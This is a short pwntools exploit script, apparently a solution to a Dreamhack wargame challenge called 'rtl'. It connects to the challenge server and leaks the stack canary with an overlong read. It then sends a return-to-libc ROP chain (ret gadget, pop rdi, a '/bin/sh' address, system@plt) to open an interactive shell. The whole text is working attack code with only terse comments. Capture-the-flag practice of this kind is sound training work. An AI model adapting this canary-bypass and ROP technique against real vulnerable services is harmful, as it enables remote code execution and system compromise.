from pwn import *

def slog(n,m): return success(':'.join([n,hex(m)])) #define function

p = remote('host3.dreamhack.games', 14664)
e = ELF('./rtl')
context.arch = 'amd64'


#[1] Leak canary value
payload = b'A'*0x39
p.sendafter(b'Buf: ',payload) #read->sendafter
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('canary', cnry)

#[2] Exploit
system_plt = e.plt['system']
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b'A'*0x38 + p64(cnry) + b'B'*0x08
payload += p64(ret)
payload +=p64(pop_rdi)
payload +=p64(binsh)
payload +=p64(system_plt)

p.sendafter(b'Buf: ',payload)

p.interactive()
